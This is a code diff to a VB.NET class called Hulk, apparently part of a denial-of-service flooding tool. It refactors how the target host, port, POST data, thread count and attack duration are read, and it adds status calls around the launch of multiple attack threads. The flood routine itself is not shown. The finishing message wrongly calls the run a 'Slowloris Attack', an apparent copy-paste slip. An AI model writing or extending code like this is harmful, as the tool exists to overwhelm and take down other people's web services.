@@ -17,12 +17,12 @@ Public Class Hulk
     Public Sub New(ByVal model As HulkModel)
         If Not AttackRunning = True Then
             AttackRunning = True
-            HostToAttack = model.Host
-            Ports = model.Port
-            PostDATA = model.PostDATA
-            ThreadstoUse = model.ThreadstoUse
-            TimetoAttack = model.Time
-            RandomFile = model.RandomFile
+            HostToAttack = model.newBaseFloodModel.Host
+            Ports = model.newHulkVariables.Port
+            PostDATA = model.newHulkVariables.PostDATA
+            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
+            TimetoAttack = model.newBaseFloodModel.Time
+            RandomFile = model.newHulkVariables.RandomFile
 
             If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
             If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
@@ -30,7 +30,8 @@ Public Class Hulk
 
 
             Threads = New Thread(ThreadstoUse - 1) {}
-            GetFloodsBase().SetMessage("Hulk attack")
+            GetFloodsBase().Reset()
+            GetFloodsBase().SetMessage("Hulk attack started")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -51,7 +52,7 @@ Public Class Hulk
             AttackRunning = False
             GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
-
+            GetFloodsBase().SetEnd()
         End If
 
     End Sub
